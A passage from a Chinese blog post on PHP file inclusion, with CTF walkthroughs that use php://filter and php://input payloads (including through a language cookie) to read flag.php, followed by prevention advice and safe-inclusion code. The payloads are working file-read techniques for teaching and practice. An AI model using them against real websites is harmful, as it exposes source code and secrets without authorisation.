<h5 id="提交获得答案进行base64解码即可">提交获得答案，进行base64解码即可<img src="https://img2023.cnblogs.com/blog/3633127/202504/3633127-20250424200615034-531594225.png" alt="屏幕截图 2025-04-24 185310" loading="lazy"></h5>
</li>
</ul>
</li>
<li>
<h4 id="方法二--phpinput">方法二  php://input</h4>
<ul>
<li>
<h5 id="payload如下-1">payload如下</h5>
<pre><code class="language-php">?file2=php://input&amp;file1=php://filter/convert.base64-encode/resource=flag.php
</code></pre>
</li>
<li>
<h5 id="输入此url打开bp进行抓包然后写入post参数">输入此URL，打开BP进行抓包，然后写入POST参数<img src="https://img2023.cnblogs.com/blog/3633127/202504/3633127-20250424200614591-2068610481.png" alt="屏幕截图 2025-04-24 190141" loading="lazy"></h5>
</li>
<li>
<h5 id="发送至重发模块发送获得flag">发送至重发模块，发送，获得flag<img src="https://img2023.cnblogs.com/blog/3633127/202504/3633127-20250424200614131-784204384.png" alt="屏幕截图 2025-04-24 190241" loading="lazy"></h5>
</li>
<li>
<h5 id="使用bp自带的解码工具进行解码选中编码内容右侧获得flag">使用BP自带的解码工具进行解码，选中编码内容，右侧获得flag<img src="https://img2023.cnblogs.com/blog/3633127/202504/3633127-20250424200613585-1683567154.png" alt="屏幕截图 2025-04-24 190417" loading="lazy"></h5>
</li>
</ul>
</li>
</ul>
</li>
<li>
<h4 id="fileinclude宜兴网信办"><a href="https://adworld.xctf.org.cn/challenges/list" target="_blank" rel="noopener nofollow">fileinclude(宜兴网信办)</a></h4>
<ul>
<li>
<h5 id="进入例题发现直接告诉我们flag位置还问我们要选择的语言">进入例题，发现直接告诉我们flag位置，还问我们要选择的语言<img src="https://img2023.cnblogs.com/blog/3633127/202504/3633127-20250424200613099-329059368.png" alt="屏幕截图 2025-04-24 192945" loading="lazy"></h5>
</li>
<li>
<h5 id="发现没有其他有用的信息查看页面源码代码审计页面会对每一次的请求获取它的cookies键为language如果没有这个键的cookies那么就自动设置为english并且返回其php界面如果有这个键的cookies就将其加上php变为php后包含">发现没有其他有用的信息，查看页面源码，代码审计，页面会对每一次的请求获取它的cookies，键为language，如果没有这个键的cookies，那么就自动设置为english，并且返回其php界面，如果有这个键的cookies，就将其加上".php"变为PHP后包含<img src="https://img2023.cnblogs.com/blog/3633127/202504/3633127-20250424200612723-281531713.png" alt="屏幕截图 2025-04-24 193125" loading="lazy"></h5>
</li>
<li>
<h5 id="那么现在思路清晰了首先需要将cookies对应的language键对应的value设置为存在值否则就会显示englishphp这个界面都知道出题人没有这么好心所以我们肯定要跳出这个检查条件然后language的值应该为什么呢如果是english最后会包含输出englishphp这个界面如果是chinese最后就会包含输出chinesephp这个界面开头给了提示说flag在flagphp这个界面如果language的值为flag最后是不是就会输出flagphp最后用上咱上面讲到的伪协议进行读取">那么现在思路清晰了，首先需要将cookies对应的language键对应的value设置为存在值，否则就会显示english.php这个界面，都知道出题人没有这么好心，所以我们肯定要跳出这个检查条件，然后language的值应该为什么呢，如果是english，最后会包含输出english.php这个界面，如果是chinese,最后就会包含输出chinese.php这个界面，开头给了提示，说flag在flag.php这个界面，如果language的值为flag，最后是不是就会输出flag.php，最后用上咱上面讲到的伪协议进行读取</h5>
</li>
<li>
<h5 id="payload如下-2">payload如下</h5>
<pre><code class="language-php">language=php://filter/convert.base64-encode/resource=flag
</code></pre>
</li>
<li>
<h5 id="使用bp抓包发送至重发模块">使用BP抓包，发送至重发模块<img src="https://img2023.cnblogs.com/blog/3633127/202504/3633127-20250424200612251-1855879044.png" alt="屏幕截图 2025-04-24 195036" loading="lazy"></h5>
</li>
<li>
<h5 id="发现请求包中并没有cookies在这里我们点击右边的request-cookies添加cookies信息">发现请求包中并没有cookies，在这里我们点击右边的"Request cookies"添加cookies信息<img src="https://img2023.cnblogs.com/blog/3633127/202504/3633127-20250424200611786-1224828967.png" alt="屏幕截图 2025-04-24 195304" loading="lazy"></h5>
</li>
<li>
<h5 id="添加之后进行发送获得编码的flag解码后获得flag明文">添加之后，进行发送，获得编码的flag，解码后获得flag明文<img src="https://img2023.cnblogs.com/blog/3633127/202504/3633127-20250424200611246-1058851918.png" alt="屏幕截图 2025-04-24 195623" loading="lazy"></h5>
</li>
</ul>
</li>
</ul>
</li>
<li>
<h3 id="预防措施">预防措施</h3>
</li>
<li>
<ul>
<li>
<p><strong>白名单验证</strong>，如仅允许包含预定义的安全文件路径（如<code>/var/www/include/</code>下的文件）</p>
<pre><code class="language-php">$allowed_files = ['header.php', 'footer.php'];
if (in_array($_GET['file'], $allowed_files)) {
    include $_GET['file'];
}
</code></pre>
</li>
<li>
<p><strong>禁止路径遍历符号</strong>，如过滤<code>../</code>、<code>/</code>等字符，或使用<code>realpath()</code>规范化路径</p>
<pre><code class="language-php">$file = realpath($_GET['file']);
if (strpos($file, '/var/www/allowed/') !== 0) {
    die("Access denied");
}
</code></pre>
</li>
<li>
<p><strong>限制文件访问范围</strong>，如使用<code>open_basedir</code>（PHP）或类似配置限制文件访问目录或避免使用相对路径，强制使用绝对路径</p>
<pre><code class="language-php">; php.ini配置
open_basedir = "/var/www/allowed/:/tmp"
</code></pre>
</li>
<li>
<p><strong>禁用危险配置</strong></p>
<ul>
<li>关闭远程文件包含功能（如 PHP 的<code>allow_url_include = Off</code>）</li>
<li>限制文件上传目录的执行权限（如设置为<code>755</code>并禁止 PHP 解析）</li>
</ul>
</li>
<li>
<p><strong>输入转义与过滤</strong>，使用<code>basename()</code>函数获取文件名，剥离路径信息</p>
<pre><code class="language-php">$file = basename($_GET['file']);
include "/var/www/allowed/" . $file;
</code></pre>
<p>对特殊字符（如<code>?</code>, <code>%</code>, <code>#</code>）进行 URL 解码和转义</p>
</li>
<li>
<p><strong>最小化文件权限</strong></p>
<ul>
<li>确保 Web 服务器账户（如<code>www-data</code>）仅拥有必要的文件读取权限。</li>
<li>敏感文件（如配置文件）存放在 Web 根目录外</li>
</ul>
</li>
<li>
<p><strong>日志监控与应急响应</strong></p>
<ul>
<li>记录异常文件包含请求，及时发现攻击行为。</li>
<li>定期更新框架和依赖库，修复已知漏洞（如旧版 CMS 的文件包含漏洞）</li>
</ul>
</li>
</ul>
</li>
<li>
<h3 id="实例代码">实例代码</h3>
<pre><code class="language-php">// 安全的文件包含实现
$allowed_dir = '/var/www/allowed/';
$file = $_GET['file'];

// 1. 检查文件路径是否合法
if (!is_string($file) || empty($file)) {
    die("Invalid file");
}

// 2. 规范化路径并验证是否在允许目录内
$real_path = realpath($allowed_dir . $file);
if ($real_path === false || strpos($real_path, $allowed_dir) !== 0) {
    die("Access denied");
}

// 3. 检查文件类型（可选）
if (!preg_match('/\.(php|html)$/', $real_path)) {
    die("Invalid file type");
}

// 4. 包含文件
include $real_path;
</code></pre>
</li>
</ul>
<h3 id="如果文章中存在错误还请家人们不吝指出轻点骂码字不易敬请谅解">如果文章中存在错误，还请家人们不吝指出，轻点骂，码字不易，敬请谅解</h3>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0.012139928961805555" data-date-created="BlogServer.Application.Dto.BlogPost.BlogPostDto" data-date-updated="2025-04-24 20:14">2025-04-24 20:13</span>&nbsp;
<a href="https://www.cnblogs.com/big-blame-general">水枪装尿，滋谁谁叫</a>&nbsp;
阅读(<span id="post_view_count">0</span>)&nbsp;
评论(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(18845250);return false;">收藏</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '18845250', targetLink: 'https://www.cnblogs.com/big-blame-general/p/18845250', title: '文件包含' })">举报</a>
</div>
        